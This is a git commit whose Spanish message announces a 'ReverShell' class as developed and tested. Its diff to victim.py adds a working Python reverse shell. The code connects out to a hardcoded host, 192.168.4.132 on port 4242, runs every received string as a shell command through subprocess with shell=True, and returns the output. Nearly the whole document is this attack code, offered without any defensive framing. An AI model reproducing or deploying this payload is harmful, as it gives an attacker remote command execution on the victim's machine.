c5cdc990177b6fe51e925fe39a347180f549e261
nachh <iortego42madrid@gmail.com>
2023-07-26 20:18:51 +0200

    Clase ReverShell desarrollada y testeada, proxima meta, cliente

--- victim.py
+++ victim.py
@@ -1,13 +1,48 @@
 import socket
-import os
+import subprocess
 
-host = '127.0.0.1'
-port = 4444
 BUFFER_SIZE = 1024
 MESSAGE = 'echo Hola, mundo!'
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as socket_tcp:
-    socket_tcp.connect((host, port))
-    # Convertimos str a bytes
-    socket_tcp.send(MESSAGE.encode('utf-8'))
-    data = socket_tcp.recv(BUFFER_SIZE)
-    os.system(data.decode('utf-8'))
+
+
+class Shell:
+    def __init__(self, ip, port, buffer_size=2048):
+        self.port = port
+        self.ip = ip
+        self.bufs = buffer_size
+        self.address = (self.ip, self.port)
+        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connected = True
+
+    def connect(self):
+        try:
+            self.socket.connect(self.address)
+            while True:
+                self.chunk = self.socket.recv(self.bufs)
+                self.chunks = []
+                self.chunks.append(self.chunk)
+                while len(self.chunk) != 0 and chr(self.chunk[-1]) != '\n':
+                    self.chunk = self.socket.recv(self.bufs)
+                    self.chunks.append(self.chunk)
+                output = self.execCmd()
+                if output is False:
+                    break
+                self.socket.sendall(output.stdout)
+
+        except (TimeoutError):
+            raise TimeoutError
+
+    def execCmd(self):
+        cmd = (b''.join(self.chunks)).decode()[:-1]
+        if cmd == "exit":
+            self.socket.close()
+        print("comando: ", cmd)
+        output = subprocess.run(cmd, stdout=subprocess.PIPE,
+                                stderr=subprocess.PIPE, stdin=subprocess.PIPE,
+                                shell=True)
+        print("salida: ", output)
+        return output
+
+
+session = Shell("192.168.4.132", 4242)
+session.connect()
